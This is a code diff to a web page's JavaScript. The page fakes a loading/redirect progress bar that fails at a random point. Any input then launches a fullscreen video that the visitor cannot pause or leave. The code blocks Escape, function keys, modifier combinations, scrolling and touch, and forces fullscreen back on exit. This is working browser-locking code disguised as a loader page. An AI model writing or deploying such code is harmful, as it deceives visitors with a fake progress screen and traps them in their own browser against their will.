@@ -10,30 +10,24 @@ window.addEventListener('load', function() {
     const redirectBox = document.querySelector('#redirect-box');
     const errorBox = document.querySelector('#error-box');
 
-    const minDuration = 2000;
-    const maxDuration = 60000;
-    const totalDuration = Math.random() * (maxDuration - minDuration) + minDuration;
     let progress = 0;
-    let startTime = Date.now();
     let videoTriggered = false;
+    const failPoint = Math.floor(Math.random() * 99) + 1; // Random fail between 1-99%
 
     function updateProgress() {
         if (videoTriggered) return;
 
-        const elapsedTime = Date.now() - startTime;
-        const progressPercentageValue = (elapsedTime / totalDuration) * 100;
+        const increment = Math.random() * 5 + 2; // Faster loading (2-7% per step)
+        progress = Math.min(progress + increment, 100);
+        progressBar.style.width = progress + '%';
+        progressPercentage.textContent = Math.floor(progress) + '%';
 
-        if (progressPercentageValue < 100) {
-            const increment = Math.random() * 2.5 + 0.5;
-            progress = Math.min(progress + increment, progressPercentageValue);
-            progressBar.style.width = progress + '%';
-            progressPercentage.textContent = Math.floor(progress) + '%';
-
-            const delay = Math.random() * 2500 + 500;
-            setTimeout(updateProgress, delay);
-        } else {
+        if (progress >= failPoint) {
             redirectBox.style.display = 'none';
             errorBox.classList.remove('hidden');
+        } else {
+            const randomDelay = Math.random() * 400 + 50; // Random delay between 50-450ms
+            setTimeout(updateProgress, randomDelay);
         }
     }
 
@@ -94,7 +88,6 @@ window.addEventListener('load', function() {
 
         enterFullscreen();
 
-        // Monitor state every 100ms
         setInterval(() => {
             if (video.paused && !video.ended) {
                 video.play().catch(err => {
@@ -107,7 +100,6 @@ window.addEventListener('load', function() {
         }, 100);
     }
 
-    // Prevent pausing
     video.addEventListener('pause', function(event) {
         if (videoTriggered && !video.ended) {
             event.preventDefault();
@@ -115,22 +107,25 @@ window.addEventListener('load', function() {
         }
     });
 
-    // Block all unnecessary keys
     const specialInputs = [
-        'Control', 'Shift', 'CapsLock', 'Alt', 'AltGraph', 'Meta', 'Tab',
+        'Control', 'CapsLock', 'Alt', 'AltGraph', 'Meta', 'Tab',
         'Escape', 'F1', 'F2', 'F3', 'F4', 'F5', 'F6', 'F7', 'F8', 'F9', 'F10', 'F11', 'F12',
         'Space', 'ArrowUp', 'ArrowDown', 'ArrowLeft', 'ArrowRight'
     ];
 
     document.addEventListener('keydown', function(event) {
-        if (specialInputs.includes(event.key) || event.ctrlKey || event.altKey || event.shiftKey || event.metaKey) {
+        // Allow Shift and Arrow keys in text box before video triggers
+        if (!videoTriggered && (event.key === 'Shift' || event.key.startsWith('Arrow')) && event.target === incidentInput) {
+            return;
+        }
+        // Block special keys (excluding Shift in text box) and modifier combos
+        if (specialInputs.includes(event.key) || event.ctrlKey || event.altKey || event.metaKey) {
             event.preventDefault();
         } else if (!videoTriggered && event.target !== incidentInput) {
             playVideo();
         }
     });
 
-    // Text box interactions
     incidentInput.addEventListener('click', function(event) {
         event.stopPropagation();
     });
@@ -144,12 +139,11 @@ window.addEventListener('load', function() {
     incidentInput.addEventListener('keydown', function(event) {
         if ((event.key === 'Enter' || event.key === 'Backspace') && !videoTriggered) {
             playVideo();
-        } else if (videoTriggered) {
-            event.preventDefault();
+        } else if (videoTriggered && !event.key.startsWith('Arrow')) {
+            event.preventDefault(); // Block all except arrows after trigger
         }
     });
 
-    // Trigger video on clicks
     clickLink.addEventListener('click', function(event) {
         event.preventDefault();
         playVideo();
@@ -173,7 +167,6 @@ window.addEventListener('load', function() {
         }
     });
 
-    // Disable wheel and touch
     document.addEventListener('wheel', function(event) {
         event.preventDefault();
     }, { passive: false });
@@ -194,7 +187,6 @@ window.addEventListener('load', function() {
         event.preventDefault();
     }, { passive: false });
 
-    // Re-enter fullscreen on exit
     document.addEventListener('fullscreenchange', function() {
         if (!document.fullscreenElement && videoTriggered) {
             enterFullscreen();
